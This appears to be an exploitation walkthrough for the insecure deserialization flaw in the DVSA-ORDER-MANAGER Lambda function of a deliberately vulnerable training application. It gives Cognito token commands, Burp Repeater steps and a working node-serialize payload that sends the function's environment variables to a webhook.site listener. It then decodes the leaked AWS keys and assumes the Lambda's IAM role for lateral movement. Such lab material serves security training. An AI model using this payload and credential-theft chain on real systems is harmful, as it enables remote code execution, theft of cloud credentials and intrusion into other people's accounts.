This guide provides the steps to reproduce the **Insecure Deserialization** vulnerability in the **DVSA-ORDER-MANAGER** Lambda function, as demonstrated in your video and the provided documentation. This exploit leverages the `node-serialize` library's ability to execute arbitrary code when it encounters the `_$$ND_FUNC$$_` prefix.

---

## Step 1: Authentication & Target Discovery

Before interacting with the API, you must obtain a valid **Cognito Access Token** and the **API Gateway URL**.

1.  **Retrieve Cognito Details:**
    ```bash
    aws cognito-idp list-user-pools --max-results 10
    aws cognito-idp list-user-pool-clients --user-pool-id <User-Pool-Id>
    ```
2.  **Generate Access Token:**
    Store the token in a variable for easy use:
    ```bash
    TOKEN=$(aws cognito-idp admin-initiate-auth \
      --auth-flow ADMIN_NO_SRP_AUTH \
      --user-pool-id <User-Pool-Id> \
      --client-id <Client-Id> \
      --auth-parameters USERNAME=<email>,PASSWORD=<password> \
      --query 'AuthenticationResult.AccessToken' \
      --output text)
    ```
3.  **Identify the Endpoint:**
    Find the API ID and stage (e.g., `dvsa`) to construct the full URL: `https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order`.

---

## Step 2: Capture Request via Burp Suite

The video demonstrates using **Burp Suite** to intercept the legitimate traffic and modify it.

1.  Open the **DVSA application** in the Burp-integrated browser.
2.  Navigate to the **Orders** page.
3.  In Burp, go to the **Proxy** tab and ensure **Intercept is on**.
4.  Refresh the Orders page or trigger an action to capture the `POST /order` request.
5.  Right-click the captured request and select **Send to Repeater**.

---

## Step 3: Craft the Exploit Payload

The vulnerability lies in how the `action` field is processed. You will replace the standard `orders` action with a serialized JavaScript function.

### The Payload Structure
The `node-serialize` library executes code if a string starts with `_$$ND_FUNC$$_` followed by an Immediately Invoked Function Expression (IIFE).

**Exfiltration Payload (Environment Variables):**
```javascript
"_$$ND_FUNC$$_function(){
    var h=require('https');
    h.get('https://webhook.site/<your-id>?' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
}()"
```

**Modified Request Body in Burp Repeater:**
```json
{
  "action": "_$$ND_FUNC$$_function(){ var h=require('https'); h.get('https://webhook.site/YOUR-WEBHOOK-ID?' + Buffer.from(JSON.stringify(process.env)).toString('base64')); }()",
  "cart-id": ""
}
```

---

## Step 4: Execute & Exfiltrate

1.  In the **Repeater** tab, ensure your `Authorization` header contains the `$TOKEN` obtained in Step 1.
2.  Click **Send**.
3.  The Lambda function will execute the injected code. While the API response might appear normal (listing orders), the background process will send the exfiltrated data to your listener.
4.  Navigate to [Webhook.site](https://webhook.site/) and look for a new **GET** request. The exfiltrated data will be appended to the URL as a Base64 string.

---

## Step 5: Decoding Results with CyberChef

To read the exfiltrated Lambda environment variables (which include `AWS_ACCESS_KEY_ID` and `AWS_SESSION_TOKEN`):

1.  Copy the Base64 string from the Webhook.site query parameters.
2.  Open **CyberChef**.
3.  Add the **From Base64** recipe to the pipeline.
4.  (Optional) Add **JSON Beautify** for readability.
5.  Paste the string into the **Input** area to reveal the sensitive environment data.

---

## Step 6: Verify Persistence and Lateral Movement

Once you have the temporary credentials from the environment variables, you can assume the Lambda's IAM role locally:

```bash
export AWS_ACCESS_KEY_ID=<leaked-key>
export AWS_SECRET_ACCESS_KEY=<leaked-secret>
export AWS_SESSION_TOKEN=<leaked-token>

# Verify identity
aws sts get-caller-identity
```

From here, you can list other Lambda functions or query the Cognito User Pool to identify administrative accounts, as shown in the lateral movement section of your documentation.
